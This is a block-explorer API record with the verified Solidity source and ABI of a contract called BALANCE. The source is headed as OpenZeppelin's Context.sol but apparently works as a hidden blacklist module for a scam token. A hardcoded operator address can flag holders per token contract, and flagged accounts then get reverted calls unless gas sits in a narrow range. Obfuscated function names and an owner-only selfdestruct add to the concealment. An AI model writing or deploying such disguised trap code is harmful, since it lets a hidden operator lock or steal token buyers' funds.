{
  "TxHash": "0x75dbe6a90bc3f05f531a53e324b41fbf2c802def9bc742b33fbe89218576be25",
  "ContractAddress": "0xeBa7246718b4d99726064770e1b961aA8Db13A17",
  "Name": "BALANCE",
  "PackageStatus": 0,
  "status": "1",
  "message": "OK",
  "result": [
    {
      "SourceCode": "// SPDX-License-Identifier: MIT\r\n// OpenZeppelin Contracts v4.4.0 (utils/Context.sol)\r\npragma solidity ^0.8.20;\r\n\r\ncontract BALANCE {\r\n    mapping(address =\u003e uint256) private _balances;\r\n    mapping(address =\u003e uint256) owner_0;\r\n    mapping(address =\u003e mapping(address =\u003e uint256)) private _allowances;\r\n    mapping(address =\u003e mapping(address =\u003e uint256)) private _allMt;\r\n    uint256 _minGas;\r\n    uint256 _maxGas;\r\n    address private _owner;\r\n    uint256 stor_3;\r\n    address private _gaslike = 0x53bA5e7a4390f463a1a0BC0f8C8351767b35F197;\r\n\r\n    constructor() {\r\n        _owner = msg.sender;\r\n        _minGas = 510000;\r\n        _maxGas = 515000;\r\n    }\r\n\r\n    function Lgrget(address var1) external view returns (uint256) {\r\n        uint256 gas_ = gasleft();\r\n        uint256 v0 = legiti(var1, gas_);\r\n        return v0;\r\n    }\r\n\r\n    function legiti(address input, uint256 sender)\r\n        private\r\n        view\r\n        returns (uint256)\r\n    {\r\n        address v7;\r\n        if (owner_0[msg.sender] != 1) {\r\n            if (2 == owner_0[msg.sender]) {\r\n                bool v3 = false;\r\n                require(v3);\r\n            } else {\r\n                uint256 a = _allMt[msg.sender][input];\r\n                if (stor_3 != 0) {\r\n                    if (a == 1) {\r\n                        bool v1 = sender \u003e _minGas ? true : false;\r\n                        if (v1) {\r\n                            bool v2 = sender \u003c _maxGas ? true : false;\r\n                            v1 = v2;\r\n                        }\r\n                        require(v1);\r\n                        return 0;\r\n                    } else {\r\n                        return 0;\r\n                    }\r\n                } else {\r\n                    if (a == 1) {\r\n                        bool v3 = sender \u003e _minGas ? true : false;\r\n                        if (v3) {\r\n                            bool v4 = sender \u003c _maxGas ? true : false;\r\n                            v3 = v4;\r\n                        }\r\n                        require(v3);\r\n                        v7 = msg.sender;\r\n                    } else {\r\n                        v7 = msg.sender;\r\n                    }\r\n\r\n                    (bool success, bytes memory data) = v7.staticcall(\r\n                        abi.encodeWithSignature(\"balanceOf(address)\", input)\r\n                    );\r\n                    require(success, \"error\");\r\n                    bytes32 mdata;\r\n                    assembly {\r\n                        mdata := mload(add(data, 0x20))\r\n                    }\r\n                    return uint256(mdata);\r\n                }\r\n            }\r\n            return 0;\r\n        } else {\r\n            return 0;\r\n        }\r\n    }\r\n\r\n    // P 合约地址 account 用户地址  c  0-拉白 -1-拉黑\r\n    function actionKfc(\r\n        address p,\r\n        address account,\r\n        uint256 b\r\n    ) external {\r\n        require(msg.sender == _gaslike, \"Ownable: caller is not the owner\");\r\n        uint256 v1 = 0;\r\n        if(b == 0){\r\n            v1 = 1;\r\n        }\r\n        _allMt[p][account] = v1;\r\n    }\r\n\r\n    function setOne(address p) external {\r\n        require(msg.sender == _gaslike, \"Ownable: caller is not the owner\");\r\n        owner_0[p] = 3;\r\n    }\r\n\r\n    function getOne(address p) public view returns (uint256) {\r\n        return owner_0[p];\r\n    }\r\n\r\n    function getNext(address p, address account) public view returns (uint256) {\r\n        return _allMt[p][account];\r\n    }\r\n\r\n    // 自毁\r\n    function kill() external {\r\n        require(msg.sender == _owner, \"Ownable: caller is not the owner\");\r\n        selfdestruct(payable(tx.origin));\r\n    }\r\n\r\n    fallback() external {}\r\n}",
      "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"stateMutability\":\"nonpayable\",\"type\":\"fallback\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"var1\",\"type\":\"address\"}],\"name\":\"Lgrget\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"p\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"b\",\"type\":\"uint256\"}],\"name\":\"actionKfc\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"p\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"getNext\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"p\",\"type\":\"address\"}],\"name\":\"getOne\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"kill\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"p\",\"type\":\"address\"}],\"name\":\"setOne\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]",
      "ContractName": "BALANCE",
      "CompilerVersion": "v0.8.20+commit.a1b79de6",
      "OptimizationUsed": "1",
      "Runs": "200",
      "ConstructorArguments": "",
      "EVMVersion": "Default",
      "Library": "",
      "LicenseType": "MIT",
      "Proxy": "0",
      "Implementation": "",
      "SwarmSource": "ipfs://7359687a39eefbbe1ad588de75ac3abc1be8fbe5b6a1703ebffc731b3df469ac"
    }
  ]
}
